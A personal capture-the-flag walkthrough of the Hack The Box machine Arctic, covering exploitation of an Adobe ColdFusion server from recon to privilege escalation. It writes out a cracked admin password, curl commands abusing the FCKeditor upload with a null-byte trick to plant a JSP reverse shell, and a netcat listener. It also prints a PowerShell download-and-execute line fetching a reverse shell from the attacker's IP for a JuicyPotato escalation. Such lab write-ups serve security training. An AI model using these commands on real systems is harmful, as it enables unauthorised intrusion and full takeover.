**Note: I solved these machines when I started my career. Recently I was checking my old study materials and found this all so I am posting it as it is how I wrote earlier**

# Short brief what I did: I scanned the machine and checked for available ports and found few ports open, later further recon i found some interesting files which was the connecting steps to gain root. Enjoy! Happy Hacking!!

Letâ€™s check in the browser â€“ 10.10.10.11:8500
Found some index files
Going inside administrator got a login page â€“ adobe coldfusion 
So, letâ€™s search for vuln or exploit.
#searchsploit adobe coldfusion
Found many filesâ€¦so letâ€™s choose directory travasel file â€“ 14641.py
There a directory was given where the password of administrator was stored in hash.
So I used crackstation â€“ password â€“ happyday
So immediately logged in with this cred
After logging I was not able to find anythingâ€¦
So later I googled about adobe coldfusion exploit found 2 exploitsâ€¦first directory traversal and another is RCEâ€¦.
So, in the RCE it was instructing to create a msfvenom payload and upload to directory.
Following some writeupâ€¦uploaded to directoryâ€¦but the file was not showing in the browser.
This was the reason [it makes two HTTP requests. First is a POST to FCKEDITOR_DIR, which has a default value of /CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm defined earlier in the script. Then it does a GET to /userfiles/file/ to trigger the payload.]

# curl -X POST -F newfile=@shell.jsp 'http://10.10.10.11:8500/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/shell.jsp%00'


                <script type="text/javascript">
                        window.parent.OnUploadCompleted( 202, "", "shell.jsp", "0" );
                </script>
                                                                                                                                                             
â”Œâ”€â”€(rootðŸ’€kali)-[~/HTB/arctic]


There are two things I need to set to get this upload to work, and both are set in the MSF exploit. First, I canâ€™t have the filename end in jsp. That will be filtered out. The MSF script uses .txt, so Iâ€™ll mimic that by making a copy of my payload named shell.txt. The MSF script also sets the Content-Type on the file to application/x-java-archive.

Iâ€™ll update the curl. I can adjust headers inside the form data by adding it inside the -F argument separated by ;:
# curl -X POST -F "newfile=@shell.jsp;type=application/x-java-archive;filename=shell.txt" 'http://10.10.10.11:8500/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/df.jsp%00'
Warning: Binary output can mess up your terminal. Use "--output -" to tell 
Warning: curl to output it to your terminal anyway, or consider "--output 
Warning: <FILE>" to save to a file.

Here my file got uploaded.and as I browsed â€¦got my fileâ€¦
Opened listener â€“ nc â€“lvvp 4444  (as per my msfvenom payload)
In the browser clicked the fileâ€¦and got the connection backâ€¦
Got user flagâ€¦

Priv escalation

As I saw SeImpersonate enabledâ€¦I quickly ran for juicy potatoâ€¦.
So here are my required files for juicypotato
1.shell.bat
2.shell.ps1
3.juicypotato.exe

# ls
JuicyPotato.exe shell.bat shell.ps1 

# cat shell.bat   
powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.14.4/shell.ps1')
#shell.ps1 is a file from nishang shell â€“ invokepowershellreversetcp.ps1 â€“ here I will add my ip and port number

Now letâ€™s run juicypotato
